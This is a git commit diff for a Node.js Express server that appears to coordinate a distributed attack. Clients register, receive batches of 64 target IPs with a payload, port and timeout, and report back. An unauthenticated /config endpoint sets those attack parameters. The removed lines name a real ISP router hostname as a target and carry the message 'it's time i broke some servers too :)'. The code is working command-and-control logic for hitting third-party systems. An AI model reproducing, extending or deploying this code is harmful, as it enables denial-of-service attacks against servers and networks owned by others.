b66ada9064d6f297ef1418705d387f239be811d1
Matthew Coal <matemate001@gmail.com>
2021-02-01 00:42:52 +0100

    feat: Config

--- index.js
+++ index.js
@@ -3,10 +3,22 @@ const { v4 } = require('uuid');
 const storage = require('./storage');
 
 const app = express();
+const config = {
+  Enabled: false, Payload: "", Port: 0, Timeout: 1000,
+};
 const reports = {};
 
 app.use(express.json());
 app.use(express.static('public/'));
+
+app.get('/config', (_, res) => {
+  res.json(config);
+});
+
+app.post('/config', (req, res) => {
+  Object.assign(config, req.body);
+  res.sendStatus(200);
+});
 
 app.get('/xhr', (_, res) => {
   res.json(reports);
@@ -14,42 +26,37 @@ app.get('/xhr', (_, res) => {
 
 app.post('/update/:uuid', (req, res) => {
   reports[req.params.uuid] = req.body;
-  res.json({
+  res.json(Object.assign({
     UUID: req.params.uuid,
     IPs: storage.getValue(req.params.uuid),
-    Payload: "I broke my heart, it's time i broke some servers too :)",
-    Timeout: 200,
-  });
+  }, config));
 });
 
 app.get('/renew/:uuid/:ip', async (req, res) => {
-  // const orig = storage.getValue(req.params.uuid);
-  // const indx = orig.indexOf(req.params.ip);
-  // if (indx === -1) {
-  //   return res.sendStatus(400);
-  // }
-  // orig.splice(indx, 1);
-  // const newip = storage.getNextIp();
-  // orig.push(newip);
-  // await storage.setValue(req.params.uuid, orig);
-  // return res.send(newip);
-  return res.send("ae-2.xr01.budapest.digicable.hu");
+  const orig = storage.getValue(req.params.uuid);
+  const indx = orig.indexOf(req.params.ip);
+  if (indx === -1) {
+    return res.sendStatus(400);
+  }
+  orig.splice(indx, 1);
+  const newip = storage.getNextIp();
+  orig.push(newip);
+  await storage.setValue(req.params.uuid, orig);
+  return res.send(newip);
 });
 
 app.post('/register', async (_, res) => {
   const newUUID = v4();
-  const newTargets = ["ae-2.xr01.budapest.digicable.hu"];
-  // for (let i = 0; i < 64; i++) {
-  //   newTargets.push(storage.getNextIp());
-  // }
-  // await storage.setValue(newUUID, newTargets);
+  const newTargets = [];
+  for (let i = 0; i < 64; i++) {
+    newTargets.push(storage.getNextIp());
+  }
+  await storage.setValue(newUUID, newTargets);
   console.log('register: assigned', newTargets[0], '-', newTargets[newTargets.length-1], 'to', newUUID);
-  res.json({
+  res.json(Object.assign({
     UUID: newUUID,
     IPs: newTargets,
-    Payload: "I broke my heart, it's time i broke some servers too :)",
-    Timeout: 200,
-  });
+  }, config));
 });
 
 storage.init().then(() => {
